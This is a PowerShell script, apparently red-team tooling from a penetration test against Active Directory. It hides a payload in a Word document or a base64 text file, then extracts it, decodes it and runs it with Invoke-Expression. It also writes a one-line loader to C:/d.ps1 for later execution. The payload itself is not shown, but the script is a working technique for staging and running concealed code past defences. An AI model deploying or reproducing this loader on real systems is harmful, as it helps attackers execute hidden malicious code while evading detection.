function Convert-exe-word
{
$wd = New-Object -com word.application
$docu = $wd.Documents.Open("D:\PT-Requests\PT-2020\Red-Teaming-AD\a.docx")
$data=$docu.Range().text
$plain=$data
iex $plain
Invoke-Expression -Command "khan"
#echo "$plain"
}

#Convert-word
#172.20.182.116
function Convert-b64
{
$wd = New-Object -com word.application
$docu = $wd.Documents.Open("D:\PT-Requests\PT-2020\Red-Teaming-AD\a.docx")
$data=$docu.Range().text
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($data)
$EncodedText =[Convert]::ToBase64String($Bytes)
$docu.close()
echo $EncodedText > "D:\PT-Requests\PT-2020\Red-Teaming-AD\a.txt"
}

#Convert-b64

function Exe-b64
{
$data= (Get-Content a.txt)
$plain=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($data))
iex $plain
Invoke-Expression -Command "khan"
}

#Exe-b64

function Exe-b64-sl
{
$plain=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(((Get-Content 'C:\a.txt'))));iex $plain;Invoke-Expression -Command "khan"
}
#Exe-b64-sl
function store-sl
{
"$plain=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(((Get-Content 'C:\a.txt'))));iex $plain;Invoke-Expression -Command 'khan'" > C:/d.ps1
$comm="C:/Windows/System32/cmd.exe /c echo $plain > d.ps1"
Invoke-Expression  "$comm"
}

store-sl